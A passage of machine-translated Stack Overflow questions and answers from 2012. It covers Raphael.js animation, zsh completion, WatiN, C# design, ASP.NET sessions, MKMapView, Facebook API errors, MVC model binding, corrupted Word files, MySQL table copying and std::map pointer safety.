我看到其他人给出的[这个答案](https://stackoverflow.com/a/2868299)应该有助于提高性能，但我试图将动画六边形的数量建立在光标移动的基础上，我不确定我是否可以使用计时器来做到这一点。

[这个答案](https://stackoverflow.com/a/7842355)提到使用画布：

> 一个不错的选择是使用 Canvas 来绘制元素。从我的实验来看，它在绘制这么多动画时会比 SVG 更快，尽管如果你使用一些动画，它们将比使用 RaphaelJS 库更难实现。

即使使用代码使用的动画，这对人们来说似乎是一条更好的途径吗？

这是我第一次使用 Raphael.js。一般来说，我在 JS 方面不是很有经验，所以任何帮助都是非常棒的！

**编辑：**编辑：另外，看到[这个](https://codereview.stackexchange.com/a/10969/16237)关于 .resize 被调用的次数比提问者可能想象的要多的答案让我想知道 .mousemove 函数是否被调用的次数（比我需要的多）比我预期的要多。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-10T12:54:31.197

我认为它扼杀了“重叠”动画，例如：

1.  六边形数字 #6 开始褪色
2.  在它褪色的一半时，另一个褪色开始

我添加了一条`stop()`指令以避免意外结果。

此外，for() 循环不会检查是否有另一个动画正在进行，也不会检查某个十六进制是否在循环内被随机选择了两次或更多次。作为一种解决方法，我添加了一个向量来缓存正在动画的六边形的索引，尽管它似乎没有太大帮助。

要查看它保存了多少（无用）动画，请取消注释最后一个`console.log()`.

此外，您的`getRandomInt()`函数产生了一些未定义的索引错误（因为您的数组索引从 0 到 1399 并且它返回了 0 到 1400 之间的整数......我改变了它。

在此处查看我的附加组件：http: [//jsfiddle.net/rz4yY/46/](http://jsfiddle.net/rz4yY/46/)

# zsh - 使用 zsh 的 compdef 或 compctl 完成某个目录，并为所有命令使用 _hosts

> ID：12215319
> 
> 赞同：6
> 
> 时间：2012-08-31T12:23:20.440
> 
> 标签：zsh, fuse, sshfs, zsh-completion

我使用 afuse 通过 sshfs 将其他主机自动挂载到我的本地文件系统。像这样：

```
afuse -o timeout=30 -o mount_template=sshfs -C %r:/ %m -o unmount_template=fusermount -u -z %m ~/remote/ 
```

这很好用，但我希望能够使用我的 ~/remote 目录自动完成/TAB 命令。Zsh 可以理解地认为 ~/remote 是空的，因为 afuse 是一个神奇的虚拟 FUSE 文件系统。一旦我手动键入主机，子目录就可以正常工作。例如 ~/remote/host/[TAB] 工作正常。

大多数 zsh compdef 教程都专注于为您的自定义命令构建自定义完成程序。这不是我想要的。

我一直在尝试使用 compdef 将该特定目录的完成覆盖到我的 hosts 文件中（使用内置的 _hosts 完成功能），但据我了解，compdef 在每个命令的基础上工作。我希望我的完成者处理所有试图在该目录上执行正常文件/目录完成的命令。

感觉就像它是如此基本，它是一个单线，只要我知道如何。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-06-30T12:55:53.497

将以下内容添加到您的`~.zshrc`文件中（或将其粘贴到命令行中以进行尝试）：

```
autoload -Uz compinit && compinit
bindkey '^I' complete-word
zstyle -e ':completion:*' fake-files _fake_files
_fake_files() {
  [[ $PWD/$PREFIX$SUFFIX == ~/remote/ ]] && 
      ISUFFIX=/
  reply=( 
      ~/remote:${(j: :v)${(s: :)${(ps:\t:)${${(f)~~"$(
        < /etc/hosts
      )"}%%\#*}##[:blank:]#[^[:blank:]]#}}}
  )
} 
```

我试过这个并且它有效。我从[`_host`源代码](https://github.com/zsh-users/zsh/blob/master/Completion/Unix/Type/_hosts#L24)中获取了长参数扩展。

# c# - 等待单击按钮

> ID：12215326
> 
> 赞同：3
> 
> 时间：2012-08-31T12:23:49.673
> 
> 标签：c#, watin

我正在学习 WatiN API，但遇到了一个问题。

我将 WatiN api 与`WebBrowser`对象/控件一起使用，它在大多数情况下都很好用。我正在尝试使用 API 在 google 中进行搜索，但 Button 没有按应有的方式单击。

我什至使用来自 WatiN 网站的相同代码（差别很小）：我的代码：

```
//need to use a thread to work with the WebBrowser object
var thread = new Thread(() =>
{
    Settings.AutoStartDialogWatcher = false;

    using (IE browser = new IE(webBrowser1.ActiveXInstance))
    {
         browser.GoTo("http://www.google.co.il");
         browser.TextField(Find.ByName("q")).Value = " woowow";
         browser.Button(Find.ByName("btnG")).Click();
    }
});
thread.SetApartmentState(ApartmentState.STA);
thread.Start(); 
```

我可以设置要添加的文本，但是`"btnG"`没有单击该按钮。

当我在没有`WebBrowser`对象/控件的情况下使用此代码时，代码工作正常。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T12:59:29.203

我发现了问题。

我需要将焦点转移到该网站。

这行代码有效：

```
 browser.NativeDocument.Body.SetFocus(); 
```

所以现在代码看起来像这样：

```
Settings.AutoStartDialogWatcher = false;

            browser = new IE(webBrowser1.ActiveXInstance);

                browser.GoTo("http://www.google.co.il");
                browser.TextField(Find.ByName("q")).Value = " woowow";

                browser.NativeDocument.Body.SetFocus(); // set focus befor u click

                browser.Button(Find.ByName("btnG")).Click();

        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start(); 
```

# c# - 什么更好 - 调用空方法或使用许多接口

> ID：12215330
> 
> 赞同：4
> 
> 时间：2012-08-31T12:24:05.363
> 
> 标签：c#

我有几个类有一个名为 Tool 的基类。在表单中，我有一个工具参考，其中包含提到的类的实例之一。当窗体上发生 MouseDown 事件时，我调用当前的工具方法 ex。“CurrentTool.MethodWhenMouseDown()”。

大多数工具都有 3 种方法：

```
MethodWhenMouseDown()
MethodWhenMouseUp()
MethodWhenMouseMove() 
```

但是一两个班级只有：

```
MethodWhenMouseDown() 
```

现在哪个更好：

1.Tool 中的三个方法都有，不需要的类调用空方法。

2.实现接口ex。IMouseMoveListener 仅由在 MouseMove 事件发生时需要执行的类实现。这样，如果 MouseMove 事件发生，我们会问：

```
if(CurrentTool is MouseMoveListener)
{
(CurrentTool as IMouseMoveListener).MethodWhenMouseMove();
} 
```

附加信息：
该程序就像 Paint 女士 - 工具是 Brush、Bucket（不需要 MethodWhenMouseMove 的工具）、LineTool 等。
在我的 PaintForm 中，我有一个抽象基类工具的引用，它存储派生类的实例之一。触发事件的是pictureBox。

> 您是否考虑过工具订阅的事件？– CodesInChaos

我认为在表单中有一个方法是很好的做法，它将在事件发生后调用，并且该方法正在调用 CurrentTool 的 siutable 方法。前任：

```
void MouseMoveSubscriber(object sender, MouseEventArgs e)
{
CurrentTool.MethodWhenMouseMove(e);
} 
```

我假设每次更改 CurrentTool 时订阅和取消订阅 CurrentTool 的方法是不好的做法？
我还考虑过在表单中​​引用所有工具，并且每个工具都会订阅该事件，并且不需要取消订阅。我认为最大的缺点是每个工具都需要检查它是否是 CurrentTool。
你怎么想的？感谢您提供的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:46:57.360

性能不是问题（当用户点击时，不必要地调用空函数的开销没有意义），所以这实际上是关于编码的易用性和代码的清晰度/复杂性/可维护性。

所以我会尽可能简单。

我会用空实现来实现一个基类，因为它干净简单。它需要派生类中的最少代码来获得所需的结果。这也是有道理的（如果你不覆盖点击调用，你本质上是在说“当鼠标被点击时，我希望什么都不做”）。

下一个选项是为鼠标上/下/单击提供事件，并让派生类订阅这些事件，如果他们愿意的话。使用事件是一种标准模式，但它的缺点是您必须处理丑陋的订阅和取消订阅调用。这样做的好处是，如果您将它们公开，这些事件可以由任何人处理，而不仅仅是派生类。

我会避免使用接口和强制转换——对我来说，这感觉像是一种笨拙的方法——它真正实现的只是将“空函数”方法分割成许多不同的类型，而不是一组简单的 3 个虚拟方法。而不是仅仅调用方法并知道它们会起作用，你必须先做很多类型转换和检查——它看起来很乱。

**编辑** 由于您在问题中添加了更多内容，因此我重新阅读了它，并且想到了另一种可能性：创建一个基本 Tool 类，该类提供*所有*派生类都需要覆盖的虚拟 MouseDown 处理程序。所有正常的工具都会由此派生。

一个附加的 DragTool 类可以派生为一个中间类，它添加了特殊的一对拖动工具所需的 MouseMove 和 MouseUp 处理程序。

IE

```
ToolBase (abstract MouseDown)
  |
  +- ClickTool1
  +- ClickTool2
  +- DragToolBase (abstract MouseMove + MouseUp)
      |
      +- DragTool1
      +- DragTool2 
```

这意味着在您的任何工具中都不会有空的实现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:28:58.353

在不知道您的情况的情况下，我会结合使用接口和基类：
基类使用空虚拟方法实现所有接口。基类是一个纯粹的便利构造。如果一个工具类想要从基类继承但不需要该方法，它不会覆盖它。

在使用工具的代码中，您将单独使用接口。像这样，其他类可以自由地直接实现您的接口。您无需任何牺牲即可获得最大的灵活性。

```
var mouseMoveListener = CurrentTool as IMouseMoveListener;
var mouseDownListener = CurrentTool as IMouseDownListener;
// ...

if(mouseMoveListener != null)
    mouseMoveListener.MethodWhenMouseMove();
if(mouseDownListener != null)
    mouseDownListener.MethodWhenMouseDown(); 
```

请注意：我`as`只使用而不是`is`与`as`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:41:58.213

这取决于实际情况。但是在您的特定情况下（UI 事件），我认为具有空处理程序（虚拟方法）的基类比许多接口要好。实际上，您所有的工具都将从某些 ToolBase 继承。并且调用代码将更小更简单，无需转换为接口。

# asp.net - 一段时间不活动后，ASP.net MVC3 应用程序在服务器上注销

> ID：12215340
> 
> 赞同：0
> 
> 时间：2012-08-31T12:24:24.587
> 
> 标签：asp.net, session, web-config, webserver, session-state

我从默认的 ASP.net MVC 3 应用程序开始，在 web.config 文件中得到以下内容：

```
 <authentication mode="Forms">
     <forms loginUrl="~/Account/LogOn" timeout="2880" />
  </authentication>
    <machineKey/>
  <profile defaultProvider="DefaultProfileProvider">
     <providers>
        <add name="DefaultProfileProvider"
             type="System.Web.Providers.DefaultProfileProvider, System.Web.Providers, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
             connectionStringName="DefaultConnection"
             applicationName="/"/>
     </providers>
  </profile>
  <membership defaultProvider="DefaultMembershipProvider">
     <providers>
        <add name="DefaultMembershipProvider"
             type="System.Web.Providers.DefaultMembershipProvider, System.Web.Providers, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" 
             connectionStringName="DefaultConnection" 
             enablePasswordRetrieval="false" 
             enablePasswordReset="true" 
             requiresQuestionAndAnswer="false" 
             requiresUniqueEmail="false" 
             maxInvalidPasswordAttempts="5"
             minRequiredPasswordLength="6" 
             minRequiredNonalphanumericCharacters="0"
             passwordAttemptWindow="10" 
             applicationName="/"                 
            />
     </providers>
  </membership>
  <roleManager enabled="true" defaultProvider="DefaultRoleProvider">
     <providers>
        <add connectionStringName="DefaultConnection"
             applicationName="/"
             name="DefaultRoleProvider" type="System.Web.Providers.DefaultRoleProvider, System.Web.Providers, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"/>
     </providers>
  </roleManager>
  <sessionState mode="InProc" customProvider="DefaultSessionProvider">
     <providers>
        <add name="DefaultSessionProvider"
             type="System.Web.Providers.DefaultSessionStateProvider, System.Web.Providers, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
             connectionStringName="DefaultConnection"
             applicationName="/"/>
     </providers>
  </sessionState> 
```

在本地测试 - 一切正常 - 我去吃午饭，回来，对我的一个控制器（需要身份验证）进行 ajax 调用，它可以工作。

我在托管 Web 服务器上部署 - 我去吃午饭，回来，对控制器进行 ajax 调用 -> 结果我不再登录 - :(。

嗯...现在我可以弄清楚服务器的应用程序池已回收，因此我的会话数据被删除了。

我一直在试图弄清楚我必须进行哪些更改，配置和代码方面，以避免这种情况，但我无法在任何地方找到此信息，或者我可能没有问正确的问题。

**当应用程序池回收时，如何确保维护用户的会话（他保持登录状态）？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:26:05.033

您需要为会话使用数据库或 asp 状态服务器。

[http://msdn.microsoft.com/en-us/library/ms178586.aspx](http://msdn.microsoft.com/en-us/library/ms178586.aspx)

# objective-c - mkmapview 中注释引脚的自定义图像

> ID：12215343
> 
> 赞同：2
> 
> 时间：2012-08-31T12:24:26.367
> 
> 标签：objective-c

自定义注释引脚在长按时更改为默认的红色引脚。

```
 - (MKAnnotationView *) mapView:(MKMapView *)mapingView viewForAnnotation:(id <MKAnnotation>) annotation {
 MKPinAnnotationView *annView = nil;
        if(annotation != mapingView.userLocation) 
        {

            static NSString *defaultPinID = kDEFAULTPINID;
            annView = (MKPinAnnotationView *)[mapingView dequeueReusableAnnotationViewWithIdentifier:defaultPinID];
            if ( annView == nil ) 
            annView = [[MKPinAnnotationView alloc]
                                             initWithAnnotation:annotation reuseIdentifier:defaultPinID] ;

            annView.canShowCallout = YES;
            annView.image = [UIImage imageNamed:@"icon.png"];//sets image for default pin

}
return annView;
}

- (void)mapView:(MKMapView *)mapView didSelectAnnotationView:(MKPinAnnotationView *)view 
    { 
        if ([[view.annotation title] isEqualToString:@"AnnotationTitle"] ) {

             view.image = [UIImage imageNamed:@"selected_IconImage.png"];
       }
    } 
```

只需触摸注释针，所选图像就会出现。但在引脚自定义图像上长按恢复为默认的红色引脚。

如何解决这个问题？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-31T12:43:35.943

使用 an`MKAnnotationView`而不是`MKPinAnnotationView`，我猜地图视图会执行某种重置，这会返回到默认图像（这是您看到的图钉图像）

# php - 未捕获的 OAuthException: (#200) Facebook PHP

> ID：12215344
> 
> 赞同：0
> 
> 时间：2012-08-31T12:24:31.533
> 
> 标签：php, facebook, facebook-graph-api, facebook-c#-sdk

当我尝试发布页面时，我会在邀请人们参加我的活动时遇到此错误。我已经在任何地方阅读并尝试了所有内容，现在我需要帮助。

```
Fatal error: Uncaught OAuthException: (#200) thrown in /usr/extra/xxxx/xxx/public_html/src/base_facebook.php on line 1238 
```

当我这样做时：

```
$facebook->api("/219507068176656/invited?users=" . $herZ, "POST") 
```

`$herZ`是用户的 ID，例如。“ *120394,39349034,293483484* ”。

这是我的源代码： http: [//pastebin.com/sCFBPdpy](http://pastebin.com/sCFBPdpy)

我找不到错误在哪里，因为没有抛出其他错误。请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T12:31:30.790

这是一个错误。

[https://developers.facebook.com/bugs/312375168858626?browse=search_5017eadead76b7a22667493](https://developers.facebook.com/bugs/312375168858626?browse=search_5017eadead76b7a22667493)

当开发人员抱怨错误时，Facebook 会解决错误。在上面的链接中，您应该报告您遇到与作者相同的问题。

# c# - MVC 3 复杂模型绑定

> ID：12215348
> 
> 赞同：1
> 
> 时间：2012-08-31T12:24:40.910
> 
> 标签：c#, asp.net-mvc, model-binding

我刚刚把自己弄得一团糟，我很难把自己想出来。我有以下域模型（为简洁而减少）：

```
public class Questionnaire
{
    public int Id { get; set; }
    public IList<QuestionGroup> QuestionGroups { get; set; }
}

public class QuestionGroup
{
    public int Id { get; set; }
    public string Name { get; set; }
    public int Order { get; set; }
    public IList<Question> Questions { get; set; }
}

public class Question
{
    public int Id { get; set; }
    public string Text { get; set; }
    public string Type { get; set; }
    public string Headings { get; set; }
    public IList<Answer> Answers { get; set; }
}

public class Answer
{
    public int Id { get; set; }
    public string Text { get; set; } 
} 
```

现在，当我`Questionnaire`在我的视图中渲染我的时候，我对每个and使用**EditorTemplates**。在渲染我时，我正在查看属性（类似于 RadioButtonList 或 TextArea）和每个属性（这是一个逗号分隔的字符串）。例如，假设我们有一个这样的初始化：`QuestionGroup``Question``Question``Type``Heading``Question`

```
var question = new Question() {
    Text = "My Question Text",
    Type = "RadioButtonList",
    Headings = "Very Difficult,2,3,4,Very Easy"
}; 
```

然后我们会得到这个：

![在此处输入图像描述](../Images/0c5ff1afe60610855a64fae94719ebe3.png)

这是在我的**EditorTemplate**中生成的，如下所示：

```
@foreach (var heading in Model.Headings.Split(','))
{
    <li>
        <div>
            <strong>@heading</strong>
            @Html.RadioButton(Model.Id.ToString(), heading)
        </div>
    </li>
} 
```

此标记如下所示：

```
<ul>
    <li>
        <div>
            <strong>Very Difficult</strong>
            <input id="group_question_1" name="group.question.1" type="radio" value="Very Difficult" />
        </div>
    </li>
    <li>
        <div>
            <strong>2</strong>
            <input id="group_question_1" name="group.question.1" type="radio" value="2" />
        </div>
    </li>
    <li>
        <div>
            <strong>3</strong>
            <input id="group_question_1" name="group.question.1" type="radio" value="3" />
        </div>
    </li>
    <li>
        <div>
            <strong>4</strong>
            <input id="group_question_1" name="group.question.1" type="radio" value="4" />
        </div>
    </li>
    <li>
        <div>
            <strong>Very Easy</strong>
            <input id="group_question_1" name="group.question.1" type="radio" value="Very Easy" />
        </div>
    </li>
</ul> 
```

我已经制作了一个**自定义模型活页夹**，但这是我有点卡住的地方。我的实际问题是：

1.  如何根据我的域模型在视图中保留选定的值？
2.  我什至使用正确的方法来处理这样的事情，还是我离题了？

我必须承认，我还处于 MVC 的学习阶段，所以我自己的尝试可能有点盲目。任何帮助总是很感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:22:45.237

您的数据库实体和视图之间应该有一个视图模型。如果你想添加前。验证在您的数据库类上使用验证属性会变得非常混乱。从长远来看，视图模型将节省您的时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-10T08:11:15.193

正如我问的另一个问题中提到的那样，设法使用自定义模型绑定器解决了这个问题：[https ://stackoverflow.com/a/12318484/961328](https://stackoverflow.com/a/12318484/961328)

# javascript - Word文件中的古怪字符（Javascript？）

> ID：12215351
> 
> 赞同：0
> 
> 时间：2012-08-31T12:24:49.150
> 
> 标签：javascript, ms-word, special-characters

以前有没有人见过这种狼吞虎咽的东西出现在文件中间？我有一个无法打开的 Word 文件，我想知道这是否是原因。我的直觉告诉我，作者直接从网络上粘贴了一张图片或链接，这让整个事情变得一团糟。如果我在记事本中清理这些东西然后尝试打开文件，它工作正常。只是想知道我是否正在查看任何恶意内容，以及在尝试打开文件之前是否存在清除此类材料的现有方法。

> IHDR %ÛVÊ sBIT |.w‚ PLTEÿÿÿ UÂÓ~ tRNS @æØf bKGD ^ H
> cmPPJCmp0712 Om•¥<br> IDAT Óc `˜cl× IEND®B`‚µ D >ÐÉêyùºÎ Œ‚ ª K© àÉêyùºÎ Œ‚ ª K© D javascript : top . 文档。next _ hit (1 5) SD >d à à ð, ² ð
> s ð A Á\
> ÿ Ã ‚Ãˆ ¿ http://iplaw. 纳。com/iplw/images/nex>t_hit。gifnexthit ÐÉêyùºÎ Œ, ª K© àÉêyùºÎ Œ, ª K© \ javascript: top . 文档。下一个 _ 命中 (1 5) yXô; H¯,,,]Ä...'c ¥« >ð €b ðÓ åcLã“¹³ß´îO)sÞ6'ÿ ¯ F n ð§ åcLã“¹³ß´îO)sÞ6'ÿ‰PNG
> 
> IHDR %ÛVÊ sBIT |.w‚ PLTEÿÿÿ UÂÓ~ tRNS @æØf bKGD ^ H
> cmPPJCmp0712 Om•¥<br> IDAT Óc `˜cl× IEND®B`‚µ D >ÐÉêyùºÎ Œ‚ ª K© àÉêyùºÎ Œ‚ ª K© D javascript : top . 文档。next _ hit (1 5) SD >d à à ð, ² ð
> s ð A Á\
> ÿ Ã ‚Ãˆ ¿ http://iplaw. 纳。com/iplw/images/nex>t_hit。gifnexthit ÐÉêyùºÎ Œ, ª K© àÉêyùºÎ Œ, ª K© \ javascript: top . 文档。下一个 _ 命中 (1 5) yXô; H¯,,]Ä...'c ¥« >ð €b ðÓ åcLã“¹³ß´îO)sÞ6'ÿ ¯ f# n ð§ åcLã“¹³ß´îO)sÞ6'ÿ‰PNG
> 
> IHDR %ÛVÊ sBIT |.w‚ PLTEÿÿÿ UÂÓ~ tRNS @æØf bKGD ^ H

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-07T16:58:04.550

感谢@AlexK.，确定这是图形编码。原来是用户从网上复制/粘贴损坏的文件。

# php - 如何将当前记录移动到另一个表并删除当前记录

> ID：12215356
> 
> 赞同：0
> 
> 时间：2012-08-31T12:24:59.000
> 
> 标签：php, mysql

我目前正在使用 PHP 在本地创建一个系统，供用户将数据插入位于一页的 14 个表中，然后该表中的所有数据应移动到数据库中自动命名为仪表板的新表中（将存储每日数据) 但最近我使用了一个按钮手动单击来执行操作，同时上述 14 个表状态中的所有数据将被自动删除。很容易让用户在第二天插入新数据，因为今天的数据已经移动到另一个表，而且当前表的数据是空的。我在所有网站上都搜索过这个问题，但没有得到任何解决方案。希望大家能帮我解决这个问题。

我使用**了 INSERT INTO**但没有工作。我应该在哪里使用**FROM**标签？因为有 8 个表需要传输，例如：sr1、sr2、sr3 等等。

我的代码如下：

```
 if ((isset($_POST["MM_insert"])) && ($_POST["MM_insert"] == "form1")) {
  $insertSQL = sprintf("INSERT INTO sr1_full (date, total_pending, appt_today, percent_appt_today, percent_complete, partial_complete, full_complete, return_technical, return_customer, return_cancel, cancel, reappt, focus, total_tepi, total_bawah) SELECT date, total_pending, appt_today, percent_appt_today, percent_complete, partial_complete, full_complete, return_technical, return_customer, return_cancel, cancel, reappt, focus, total_tepi, total_bawah FROM sr1 TRUNCATE TABLE sr1",
                           GetSQLValueString($_POST['date'], "date"),
                           GetSQLValueString($_POST['total_pending'], "int"),
                           GetSQLValueString($_POST['appt_today'], "int"),
                           GetSQLValueString($_POST['percent_appt_today'], "int"),
                           GetSQLValueString($_POST['percent_complete'], "int"),
                           GetSQLValueString($_POST['partial_complete'], "int"),
                           GetSQLValueString($_POST['full_complete'], "int"),
                           GetSQLValueString($_POST['return_technical'], "int"),
                           GetSQLValueString($_POST['return_customer'], "int"),
                           GetSQLValueString($_POST['return_cancel'], "int"),
                           GetSQLValueString($_POST['cancel'], "int"),
                           GetSQLValueString($_POST['reappt'], "int"),
                           GetSQLValueString($_POST['focus'], "int"),
                           GetSQLValueString($_POST['total_tepi'], "int"),
                           GetSQLValueString($_POST['total_bawah'], "int"));

      mysql_select_db($database_pods, $pods);
      $Result1 = mysql_query($insertSQL, $pods) or die(mysql_error());

      $insertGoTo = "main.php";
      if (isset($_SERVER['QUERY_STRING'])) {
        $insertGoTo .= (strpos($insertGoTo, '?')) ? "&" : "?";
        $insertGoTo .= $_SERVER['QUERY_STRING'];
      }
      header(sprintf("Location: %s", $insertGoTo));
    }

    mysql_select_db($database_pods, $pods);
    $query_sr1 = "SELECT * FROM sr1";
    $sr1 = mysql_query($query_sr1, $pods) or die(mysql_error());
    $row_sr1 = mysql_fetch_assoc($sr1);
    $totalRows_sr1 = mysql_num_rows($sr1);

    mysql_select_db($database_pods, $pods);
    $query_sr2 = "SELECT * FROM sr2";
    $sr2 = mysql_query($query_sr2, $pods) or die(mysql_error());
    $row_sr2 = mysql_fetch_assoc($sr2);
    $totalRows_sr2 = mysql_num_rows($sr2);

    mysql_select_db($database_pods, $pods);
    $query_sr3 = "SELECT * FROM sr3";
    $sr3 = mysql_query($query_sr3, $pods) or die(mysql_error());
    $row_sr3 = mysql_fetch_assoc($sr3);
    $totalRows_sr3 = mysql_num_rows($sr3);

    mysql_select_db($database_pods, $pods);
    $query_sr4 = "SELECT * FROM sr4";
    $sr4 = mysql_query($query_sr4, $pods) or die(mysql_error());
    $row_sr4 = mysql_fetch_assoc($sr4);
    $totalRows_sr4 = mysql_num_rows($sr4);

    mysql_select_db($database_pods, $pods);
    $query_sr5 = "SELECT * FROM sr5";
    $sr5 = mysql_query($query_sr5, $pods) or die(mysql_error());
    $row_sr5 = mysql_fetch_assoc($sr5);
    $totalRows_sr5 = mysql_num_rows($sr5);

    mysql_select_db($database_pods, $pods);
    $query_stx = "SELECT * FROM stx";
    $stx = mysql_query($query_stx, $pods) or die(mysql_error());
    $row_stx = mysql_fetch_assoc($stx);
    $totalRows_stx = mysql_num_rows($stx);

    mysql_select_db($database_pods, $pods);
    $query_kl = "SELECT * FROM kl";
    $kl = mysql_query($query_kl, $pods) or die(mysql_error());
    $row_kl = mysql_fetch_assoc($kl);
    $totalRows_kl = mysql_num_rows($kl);

    mysql_select_db($database_pods, $pods);
    $query_msc = "SELECT * FROM msc";
    $msc = mysql_query($query_msc, $pods) or die(mysql_error());
    $row_msc = mysql_fetch_assoc($msc);
    $totalRows_msc = mysql_num_rows($msc);

    mysql_select_db($database_pods, $pods);
    $query_total = "SELECT * FROM total_bawah";
    $total = mysql_query($query_total, $pods) or die(mysql_error());
    $row_total = mysql_fetch_assoc($total);
    $totalRows_total = mysql_num_rows($total); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:30:26.210

您很难找到有关如何执行此操作的信息的原因是这*不是*执行此操作的正确方法。

您不应该复制表的结构来存储“今天”的数据和前几天的数据。您*应该*做的是将所有项目存储在单个仪表板表中，并根据日期列进行过滤以确定哪些项目被视为今天的项目。您尝试采用的将行从当前表移动到存档表的方法是完全*错误*的。这不是数据库的工作方式。

综上所述，您可以通过[`select into table`](http://dev.mysql.com/doc/refman/5.0/en/ansi-diff-select-into-table.html)将所有数据`today_dashboard`移入`all_dashboard`，然后`delete from today_dashboard`将其清除来完成此操作。**不要这样做**。重新考虑您的架构以将两者存储在一张表中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:34:58.580

```
$current_date = date("m.d.y"); 
$query = "INSERT INTO table_name (date,column1, column2, column3,...)
          VALUES ($current_date,value1, value2, value3,...)";
$result=mysql_query($query); 
```

*   这样，您必须使用当前日期将所有数据插入到您的表格中。
*   将记录保存到数据库后，您必须检查当前日期是否与任何记录匹配。如果发现任何记录，您必须使用删除查询删除此记录。这样您就可以从该表中删除所有现有记录

    希望这对您有用...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:36:33.263

使用此 SQL 复制数据。

```
insert into `CopyTable` (`colum1`,`colum2`) select `colum1`,`colum2` from `Sourcetable` 
```

空表由

```
TRUNCATE TABLE  `Sourcetable` 
```

例子 ：

```
$insertSQL = "INSERT INTO sr1_full (`date`, `total_pending`, `appt_today`, `percent_appt_today`, `percent_complete`, `partial_complete`, `full_complete`, `return_technical`, `return_customer`, `return_cancel`, `cancel`, `reappt`, `focus`, `total_tepi`, `total_bawah`) SELECT `date`, `total_pending`, `appt_today`, `percent_appt_today`, `percent_complete`, `partial_complete`, `full_complete`, `return_technical`, `return_customer`, `return_cancel`, `cancel`, `reappt`, `focus`, `total_tepi`, `total_bawah` FROM `sr1`";

mysql_query($insertSQL); // data copied.

$removeSQL = "TRUNCATE TABLE sr1";

mysql_query($removeSQL); // deleted all data from sr1

//data moved 
```

# c# - 使用 Javascript 或 C# 验证网络表单

> ID：12215357
> 
> 赞同：0
> 
> 时间：2012-08-31T12:25:01.043
> 
> 标签：c#, javascript, validation, webforms

想要一键验证多个控件。如果复选框被选中，我想要验证文本框是否有内容，但不一定必须选中复选框，在这种情况下我不想检查文本框。我尝试了验证组，但每个按钮都需要控制不同的组，我需要这一切都在一个按钮下。

我对如何做到这一点的想法持开放态度 c#,javascript...等。下面是一些代码： Button3 是验证复选框 1 是否被选中的保存，如果是，则 textbox10 不能为空。我有大约四个其他实例，但彼此独立。

```
<asp:Button ID="Button3" runat="server" Height="24px" 
        Text="Save" Visible="False" Width="67px" Font-Bold="True" 

  causesvalidation="true"
  validationgroup="required"
  runat="Server" />

    <asp:CheckBox ID="CheckBox1" runat="server" 
        oncheckedchanged="CheckBox1_CheckedChanged" Text=" Breach Letter Sent" 
        ValidationGroup="required" AutoPostBack="True" Enabled="False" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:27:02.270

您想使用可以在服务器和客户端上进行验证的 CustomValidator 控件。这里的文档中有一个示例 - [http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.customvalidator.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.customvalidator.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:18:05.393

您可以使用 Ajax 验证（在 Ajax 回发中发生但您不会感觉到）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:30:08.400

我永远不会在 JavaScript 中进行表单验证。信不信由你，但有些人实际上关闭了 JavaScript！使用验证器来验证字段内容。当然，在大多数情况下，这意味着往返于服务器，但您会获得可靠且集成良好的验证。

# stl - 返回 std::map 值的地址是否安全？

> ID：12215358
> 
> 赞同：7
> 
> 时间：2012-08-31T12:25:03.763
> 
> 标签：stl, map

我有一个`std::map<std::string, myStruct>`. 返回`myStruct`条目的地址是否安全？
我确信我的条目不会被删除，但可以添加其他条目。

```
Type::iterator it = m_map.find(key);

if (it != m_map.end())
{
     return &(it->second);
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T12:31:13.347

这是安全的。
如果`std::map`只有迭代器/引用/指向已删除元素的指针无效。

参考：
**C++03 标准 23.1.2/8：**

> 只有迭代器和对已擦除元素的引用无效

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:30:22.283

它是包含对象的地址，而不是容器在其中分配的空间。

顺便说一句，试着解释一下你想要做什么以及你的目标是什么，这样我们才能更有帮助。

# string - 运行 tf history 命令后从文本文件中提取文件名

> ID：12215368
> 
> 赞同：0
> 
> 时间：2012-08-31T12:25:51.330
> 
> 标签：string, tfs, substring

我需要一些帮助。我有一个文本文件，其中有一个 TFS 命令（tfhistory）的输出：

* * *

变更集：74125 用户：JDoe 日期：2012 年 8 月 30 日，星期四，下午 3:56:06

评论：任务#12345。JDoe。

项目：

合并，编辑 $/Project Name/FolderSln/Folder1/Binary.File1.cs

合并，编辑 $/Project Name/Folder1/Folder2/SQL_File2.sql

合并，编辑 $/Project Name/Folder1/Folder2/Folder3/File3.png

签到说明： 代码审查员： 性能审查员： 安全审查员：

* * *

我的目标是过滤文件中的所有垃圾并只保留文件列表，在上面的示例中，输出将在下面。但是，对于 CS 文件，我们可以复制 dll 而不是文件

* * *

文件夹1.dll

SQL_File2.sql

文件3.png

* * *

